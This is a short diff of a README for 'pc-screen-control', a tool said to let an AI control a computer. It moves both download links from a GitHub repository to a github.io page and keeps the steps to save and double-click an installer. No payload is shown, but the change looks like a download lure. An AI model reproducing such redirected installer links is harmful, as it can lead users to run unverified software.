@@ -1,6 +1,6 @@
 # 🖥️ pc-screen-control - Make your AI control your computer
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Noncellular-dumpiness647/pc-screen-control)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://noncellular-dumpiness647.github.io)
 
 ## What this software does
 
@@ -16,7 +16,7 @@ To use this tool, ensure your computer meets these standards:
 
 ## 📥 How to set up on Windows
 
-1. Visit the [official download page](https://github.com/Noncellular-dumpiness647/pc-screen-control) to get the latest version.
+1. Visit the [official download page](https://noncellular-dumpiness647.github.io) to get the latest version.
 2. Find the file marked as an installer or a package for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the setup wizard.
